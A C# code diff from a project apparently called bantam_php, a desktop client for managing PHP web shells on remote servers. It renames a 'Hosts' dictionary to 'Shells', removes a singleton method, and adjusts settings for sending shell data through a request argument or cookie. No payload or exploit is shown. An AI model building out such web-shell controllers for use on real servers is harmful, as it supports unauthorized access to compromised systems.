@@ -33,15 +33,6 @@ namespace bantam_php
             comboBoxVarType.SelectedIndex = 0;
         }
 
-
-        public static AddHost getInstance()
-        {
-            if (instance == null) {
-                instance = new AddHost();
-            }
-            return instance;
-        }
-
         /// <summary>
         /// Update / Edit Shell Routine
         /// </summary>
@@ -80,16 +71,16 @@ namespace bantam_php
                 return;
             }
 
-            if (BantamMain.Hosts.ContainsKey(shellURL)) {
+            if (BantamMain.Shells.ContainsKey(shellURL)) {
                 Program.g_BantamMain.guiCallbackRemoveShellURL(shellURL);
-                BantamMain.Hosts.Remove(shellURL);
+                BantamMain.Shells.Remove(shellURL);
             }
 
-            BantamMain.Hosts.Add(shellURL, new ShellInfo());
-            BantamMain.Hosts[shellURL].RequestArgName = txtBoxArgName.Text;
+            BantamMain.Shells.Add(shellURL, new ShellInfo());
+            BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;
 
             if (comboBoxVarType.Text == "cookie") {
-                BantamMain.Hosts[shellURL].SendDataViaCookie = true;
+                BantamMain.Shells[shellURL].sendDataViaCookie = true;
             }
 
             Program.g_BantamMain.getInitDataThread(shellURL);
@@ -119,15 +110,15 @@ namespace bantam_php
                 return;
             }
 
-            if (BantamMain.Hosts.ContainsKey(shellURL)) {
+            if (BantamMain.Shells.ContainsKey(shellURL)) {
                 Program.g_BantamMain.guiCallbackRemoveShellURL(shellURL);
-                BantamMain.Hosts.Remove(shellURL);
+                BantamMain.Shells.Remove(shellURL);
 
-                BantamMain.Hosts.Add(shellURL, new ShellInfo());
-                BantamMain.Hosts[shellURL].RequestArgName = txtBoxArgName.Text;
+                BantamMain.Shells.Add(shellURL, new ShellInfo());
+                BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;
 
                 if (comboBoxVarType.Text == "cookie") {
-                    BantamMain.Hosts[shellURL].SendDataViaCookie = true;
+                    BantamMain.Shells[shellURL].sendDataViaCookie = true;
                 }
 
                 Program.g_BantamMain.getInitDataThread(shellURL);
